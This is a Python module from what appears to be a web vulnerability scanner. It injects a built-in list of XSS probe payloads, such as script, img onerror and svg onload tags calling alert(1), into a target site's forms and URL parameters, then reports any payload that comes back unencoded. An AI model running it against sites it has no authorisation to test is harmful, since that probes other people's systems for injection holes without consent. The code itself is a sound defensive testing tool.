"""
scanners/xss_scanner.py
ماسح XSS متقدم (نسخة متزامنة)
"""

import re
import random
import hashlib
import time
from typing import Dict, List
from urllib.parse import urljoin, urlparse, parse_qs, quote, unquote
from bs4 import BeautifulSoup
from core.scanner_base import BaseScanner
import logging

logger = logging.getLogger(__name__)

class XSSScanner(BaseScanner):
    """ماسح ثغرات XSS متقدم"""
    
    def __init__(self, target_url: str, config: Dict = None):
        super().__init__(target_url, config)
        self.payloads = self._generate_payloads()
        
    def _generate_payloads(self) -> List[Dict]:
        """إنشاء حملات XSS"""
        payloads = [
            # حملات أساسية
            {'payload': '<script>alert(1)</script>', 'type': 'basic', 'risk': 'high'},
            {'payload': '<img src=x onerror=alert(1)>', 'type': 'img_onerror', 'risk': 'high'},
            {'payload': '<svg/onload=alert(1)>', 'type': 'svg_onload', 'risk': 'high'},
            {'payload': '<body onload=alert(1)>', 'type': 'body_onload', 'risk': 'medium'},
            {'payload': '<iframe src=javascript:alert(1)>', 'type': 'iframe', 'risk': 'high'},
            
            # حملات بدون مسافات
            {'payload': '<script>alert(document.domain)</script>', 'type': 'domain', 'risk': 'high'},
            {'payload': '" onmouseover="alert(1)"', 'type': 'attribute', 'risk': 'medium'},
            {'payload': "' onmouseover='alert(1)'", 'type': 'attribute', 'risk': 'medium'},  # تم التصحيح هنا
            
            # حملات JavaScript
            {'payload': 'javascript:alert(1)', 'type': 'js_url', 'risk': 'high'},
            {'payload': 'data:text/html,<script>alert(1)</script>', 'type': 'data_url', 'risk': 'high'},
            
            # حملات متقدمة
            {'payload': '<input autofocus onfocus=alert(1)>', 'type': 'autofocus', 'risk': 'medium'},
            {'payload': '<details open ontoggle=alert(1)>', 'type': 'details', 'risk': 'low'},
        ]
        
        for i, p in enumerate(payloads):
            p['id'] = f"xss_{i:03d}"
            p['hash'] = hashlib.md5(p['payload'].encode()).hexdigest()[:8]
        
        return payloads
    
    def scan(self) -> Dict:
        """تنفيذ فحص XSS"""
        logger.info(f"Starting XSS scan for {self.target_url}")
        
        try:
            self.initialize()
            
            # جلب الصفحة الرئيسية
            main_page = self.fetch_page(self.target_url)
            if not main_page:
                self.add_warning("Could not fetch main page")
                return self.get_results()
            
            # استخراج النماذج
            input_points = self.extract_input_points(main_page)
            self.add_info(f"Found {len(input_points['forms'])} forms")
            
            # فحص النماذج
            for form in input_points['forms'][:3]:  # أول 3 نماذج فقط
                self._test_form(form)
            
            # فحص بارامترات URL
            parsed = urlparse(self.target_url)
            if parsed.query:
                self._test_url_parameters(parsed)
            
            # فحص الروابط
            for link in input_points['links'][:5]:  # أول 5 روابط
                if link['has_params']:
                    self._test_link(link['url'])
            
        except Exception as e:
            logger.error(f"XSS scan error: {e}")
            self.add_warning(f"Scan error: {str(e)}")
        finally:
            self.close()
        
        return self.get_results()
    
    def _test_form(self, form: Dict):
        """اختبار نموذج لثغرات XSS"""
        form_id = form.get('action', 'unknown')
        
        for payload in self.payloads[:10]:  # أول 10 حملات
            try:
                # بناء بيانات النموذج
                form_data = {}
                for inp in form['inputs']:
                    if inp['type'] not in ['submit', 'button']:
                        form_data[inp['name']] = payload['payload']
                
                # بناء URL
                action_url = urljoin(self.target_url, form['action'])
                if not action_url:
                    action_url = self.target_url
                
                # إرسال الطلب
                if form['method'] == 'post':
                    response = self.post_form(action_url, form_data)
                else:
                    # طريقة GET
                    from urllib.parse import urlencode
                    query = urlencode(form_data)
                    test_url = f"{action_url}?{query}"
                    response = self.fetch_page(test_url)
                
                # تحليل الاستجابة
                if response and payload['payload'] in response:
                    # التحقق من أن البايلود غير مشفر
                    if not self._is_encoded(payload['payload'], response):
                        self.add_vulnerability('XSS', {
                            'issue': f'Reflected XSS in form {form_id}',
                            'confidence': 0.9,
                            'risk': payload['risk'],
                            'evidence': f"Payload: {payload['payload']}",
                            'location': form['action'],
                            'payload_type': payload['type']
                        })
                
                self.delay()
                
            except Exception as e:
                logger.debug(f"Form test error: {e}")
    
    def _test_url_parameters(self, parsed):
        """اختبار بارامترات URL"""
        params = parse_qs(parsed.query)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        for param_name in list(params.keys())[:3]:  # أول 3 بارامترات
            for payload in self.payloads[:8]:  # أول 8 حملات
                try:
                    # بناء URL مع البايلود
                    test_params = params.copy()
                    test_params[param_name] = [payload['payload']]
                    
                    from urllib.parse import urlencode
                    new_query = urlencode(test_params, doseq=True)
                    test_url = f"{base_url}?{new_query}"
                    
                    response = self.fetch_page(test_url)
                    
                    if response and payload['payload'] in response:
                        if not self._is_encoded(payload['payload'], response):
                            self.add_vulnerability('XSS', {
                                'issue': f'Reflected XSS in URL parameter {param_name}',
                                'confidence': 0.85,
                                'risk': payload['risk'],
                                'evidence': f"Parameter: {param_name}, Payload: {payload['payload']}",
                                'location': 'URL parameters',
                                'payload_type': payload['type']
                            })
                    
                    self.delay()
                    
                except Exception as e:
                    logger.debug(f"Parameter test error: {e}")
    
    def _test_link(self, url: str):
        """اختبار رابط لثغرات منعكسة"""
        try:
            response = self.fetch_page(url)
            if response:
                # تحليل إذا كان هناك إدخال مستخدم منعكس
                parsed = urlparse(url)
                if parsed.query:
                    params = parse_qs(parsed.query)
                    for param_name, values in params.items():
                        for value in values[:2]:
                            if value and len(value) > 3 and value in response:
                                # اختبار إذا كان غير مشفر
                                encoded = self._encode_html(value)
                                if encoded not in response:
                                    self.add_info(f"Reflected parameter found: {param_name} in {url[:50]}")
        except Exception as e:
            logger.debug(f"Link test error: {e}")
    
    def _is_encoded(self, payload: str, response: str) -> bool:
        """التحقق من تشفير البايلود"""
        encoded_versions = [
            payload.replace('<', '&lt;').replace('>', '&gt;'),
            payload.replace('<', '&#60;').replace('>', '&#62;'),
            payload.replace('<', '%3C').replace('>', '%3E'),
        ]
        return any(enc in response for enc in encoded_versions)
    
    def _encode_html(self, text: str) -> str:
        """تشفير HTML"""
        return text.replace('<', '&lt;').replace('>', '&gt;')